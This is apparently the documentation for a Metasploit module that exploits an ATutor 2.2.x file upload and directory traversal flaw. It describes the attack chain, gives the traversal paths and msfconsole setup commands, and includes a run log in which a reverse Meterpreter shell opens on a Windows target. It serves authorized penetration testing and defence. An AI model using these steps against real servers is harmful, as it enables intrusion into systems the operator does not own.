## Vulnerable Application
This module exploits an arbitrary file upload vulnerability together with a directory traversal
flaw in ATutor versions 2.2.4, 2.2.2 and 2.2.1 in order to execute arbitrary commands.

This module first authenticates to ATutor, using a randomly generated token to get around the front end JavaScript verification
being used by the server. Next, the module generates a zip file containing a malicious PHP file.
The zip archive takes advantage of a directory traversal vulnerability that will cause the target to drop the PHP file
in the root server directory (`htdocs` for Windows and `html` for Linux targets) when unpacking the archive.
For Windows targets, the module assumes that the target server uses XAMPP.
However, users can override this default by setting a custom file traversal path.
The PHP file contains an encoded payload that allows for remote command execution on the target server.
The zip archive can be uploaded via two vectors, the `Import New Language` function and the `Patcher` function.
The module first uploads the archive via `Import New Language` and then attempts to execute the payload
via an HTTP GET request to the PHP file in the root server directory.
If no session is obtained, the module creates another zip archive, uploads it via the `Patcher` function
and then attempts to execute the payload the same way as before. If a session is obtained, the module automatically
attempts to remove the malicious PHP file from the present working directory.

The module is compatible with both Windows and Linux targets. Users can specify a target OS, or use the `Auto` target option.
In the latter case, the module will try to detect the target OS based on the `Server` header set by the target
in its response to an HTTP request.

The module requires valid credentials for an ATutor account with admin privileges.
It has been successfully tested against ATutor 2.2.4 running on a Windows 10 machine that used XAMPP.
Vulnerable software can be downloaded here: https://sourceforge.net/projects/atutor/files/latest/download.
ATutor is no longer being maintained and version 2.2.4 was the last release.

## Verification Steps
1. Install the module as usual
2. Start msfconsole
3. Do: `use exploit/multi/http/atutor_upload_traversal`
4. Do: `set RHOSTS [IP]`
5. Do: `set USERNAME [username for the ATutor account]`
6. Do: `set PASSWORD [password for the ATutor account]`
7. Do: `set payload [payload]`
8. Do: `set LHOST [IP]`
9. Do: `exploit`

## Targets

```
Exploit targets:

   Id  Name
   --  ----
   0   Auto
   1   Linux
   2   Windows

```


## Options
### FILE_TRAVERSAL_PATH
This is the traversal path to get from the upload path to the root server directory.
It is used to make sure the malicious PHP is dropped in the root server directory when the zip being uploaded to the target
is unpacked on the server side. The default value for Windows targets is `..\\..\\..\\..\\..\\../xampp\\htdocs\\`.
This assumes the target uses XAMPP, as recommended in the ATutor documentation.
The default value for Linux targets is `../../../../../../var/www/html/`.

### PASSWORD
The password for the ATutor account to authenticate with. This option is required.

### TARGETURI
The base path to ATutor. The default value is `/ATutor/`.

### USERNAME
The username for the ATutor account to authenticate with. This option is required.

### WfsDelay
The number of seconds to wait for a session to be created. This advanced option is used by the module to verify
if exploitation via the `Import New Language` function succeeded. The default value is 3.

## Scenarios
### ATutor 2.2.4 running on Windows 10 (XAMPP)
```
msf5 exploit(multi/http/atutor_upload_traversal) > show options
                                                                                                                  
Module options (exploit/multi/http/atutor_upload_traversal):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   FILE_TRAVERSAL_PATH                   no        Traversal path to the root server directory. Default for Windows targets: `..\..\..\..\..\../xampp\htdocs\`. Linux Default: `../../../../../../var/www/html/.`
   PASSWORD             root             yes       Password to authenticate with
   Proxies                               no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS               192.168.1.12     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                80               yes       The target port (TCP)
   SRVHOST              0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT              8080             yes       The local port to listen on.
   SSL                  false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                               no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI            /ATutor/         yes       The base path to ATutor
   URIPATH                               no        The URI to use for this exploit (default is random)
   USERNAME             root             yes       Username to authenticate with
   VHOST                                 no        HTTP server virtual host


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.28     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Auto


msf5 exploit(multi/http/atutor_upload_traversal) > run

[*] Started reverse TCP handler on 192.168.1.28:4444 
[+] Successfully authenticated as user 'root'. We have admin privileges!
[+] Identified the target OS as Win64.
[*] Setting payload to windows/x64/meterpreter/reverse_tcp.
[*] Attempting exploitation via the `Import New Language` function.
[*] Uploaded malicious PHP file vanwqiz.php.
[*] Executing payload via /vanwqiz.php/qnwgdu?=<payload>...
[*] Command Stager progress -  17.01% done (2046/12025 bytes)
[*] Command Stager progress -  34.03% done (4092/12025 bytes)
[*] Command Stager progress -  51.04% done (6138/12025 bytes)
[*] Command Stager progress -  68.06% done (8184/12025 bytes)
[*] Command Stager progress -  84.24% done (10130/12025 bytes)
[*] Sending stage (201283 bytes) to 192.168.1.12
[*] Meterpreter session 1 opened (192.168.1.28:4444 -> 192.168.1.12:49512) at 2020-06-12 13:50:47 -0400
[*] Command Stager progress - 100.00% done (12025/12025 bytes)
[+] Deleted vanwqiz.php

meterpreter >

```
